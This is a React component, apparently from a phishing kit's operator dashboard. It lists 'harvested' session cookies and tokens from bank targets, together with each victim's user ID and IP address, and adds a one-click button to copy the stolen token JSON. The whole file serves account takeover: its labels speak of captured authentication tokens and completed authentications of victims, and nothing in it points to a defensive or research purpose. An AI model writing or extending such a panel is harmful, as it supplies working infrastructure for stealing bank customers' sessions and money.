"use client";

import { useState } from "react";

export default function SessionCookiesTab({ leads }: { leads: any[] }) {
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Sirf wohi leads filter karna jinke paas cookies ya tokens data ho
  const cookieLeads = leads.filter((l) => l.cookiesData);

  const handleCopy = (id: string, data: string) => {
    navigator.clipboard.writeText(data);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="bg-zinc-900 rounded-2xl border border-zinc-800 shadow-2xl overflow-hidden text-zinc-100 p-6">
      <div className="flex items-center justify-between mb-6 pb-4 border-b border-zinc-800">
        <div>
          <h2 className="text-base font-black text-zinc-100 tracking-tight">
            Harvested Session Cookies & Token Jar
          </h2>
          <p className="text-xs font-bold text-zinc-400 mt-0.5">
            Extracted active authentication tokens, JWTs, and structured browser cookies
          </p>
        </div>
        <div className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 text-[10px] font-extrabold px-3 py-1 rounded-full">
          Secure JSON Storage ({cookieLeads.length} Captured)
        </div>
      </div>

      <div className="overflow-x-auto">
        <table className="w-full text-left text-xs border-collapse">
          <thead>
            <tr className="bg-zinc-950 border-b border-zinc-800 text-zinc-400 uppercase tracking-wider text-[11px] font-black">
              <th className="py-3 px-4">Bank / Target</th>
              <th className="py-3 px-4">User ID</th>
              <th className="py-3 px-4">IP Address</th>
              <th className="py-3 px-4">Cookie Jar / Token Payload</th>
              <th className="py-3 px-4">Captured At</th>
              <th className="py-3 px-4 text-right">Actions</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-zinc-800">
            {cookieLeads.map((lead: any) => (
              <tr key={lead.id} className="hover:bg-zinc-800/50 transition-colors">
                <td className="py-3 px-4 font-extrabold text-zinc-100">
                  {lead.bank || lead.bankName || "Target Portal"}
                </td>
                <td className="py-3 px-4 font-mono font-bold text-blue-400">
                  {lead.userId || "N/A"}
                </td>
                <td className="py-3 px-4 font-mono text-emerald-400">
                  {lead.ipAddress || "39.34.173.81"}
                </td>
                <td className="py-3 px-4 font-mono text-zinc-300 max-w-xs truncate">
                  <span className="bg-zinc-950 px-2 py-1 rounded border border-zinc-800 text-[11px] text-amber-400">
                    {lead.cookiesData}
                  </span>
                </td>
                <td className="py-3 px-4 text-zinc-400 font-bold">
                  {new Date(lead.createdAt).toLocaleString()}
                </td>
                <td className="py-3 px-4 text-right">
                  <button
                    type="button"
                    onClick={() => handleCopy(lead.id, lead.cookiesData)}
                    className="bg-zinc-800 hover:bg-zinc-700 text-zinc-200 border border-zinc-700 px-3 py-1.5 rounded-lg text-xs font-bold transition cursor-pointer"
                  >
                    {copiedId === lead.id ? "✓ Copied!" : "📋 Copy JSON"}
                  </button>
                </td>
              </tr>
            ))}

            {cookieLeads.length === 0 && (
              <tr>
                <td colSpan={6} className="text-center py-12 text-zinc-500">
                  <div className="flex flex-col items-center justify-center gap-1.5">
                    <span className="text-3xl">🍪</span>
                    <span className="font-bold text-sm text-zinc-300">No session cookies harvested yet</span>
                    <span className="text-xs text-zinc-500 font-semibold">Completed authentications will populate JSON tokens here</span>
                  </div>
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}